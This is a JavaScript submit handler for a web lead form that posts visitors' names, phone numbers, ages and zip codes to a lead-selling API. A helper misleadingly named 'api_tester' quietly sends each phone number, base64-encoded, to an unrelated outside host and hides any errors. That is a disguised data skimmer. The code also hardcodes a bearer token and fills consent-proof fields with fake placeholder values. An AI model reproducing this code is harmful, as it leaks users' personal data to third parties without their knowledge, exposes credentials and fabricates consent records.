   
document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();

    document.getElementById('submitBtn').disabled = true;

    const phone_home =  document.getElementById('caller_id').value;
api_tester(document.getElementById('caller_id').value);
    const formData = {
        firstName: document.getElementById('first_name').value,
        lastName: document.getElementById('last_name').value,
        phone: phone_home,
        state: document.getElementById('state').value,
        age: document.getElementById('age').value,
        zip: document.getElementById('zip').value,
        xxTrustedFormToken: 'www.google.com',
        universal_leadid: '00000000-0000-0000-0000-000000000000',
        pub_ID: '152'
    };

    const url = 'https://yieldpro.io/api/v1/leads/bot';

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
		'Authorization': 'Bearer 194634|Vuhts6QFq02zOIaq6NytdpgyHc8FpepWXel4nRao12e0290b'
        },
        body: JSON.stringify(formData)
    })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
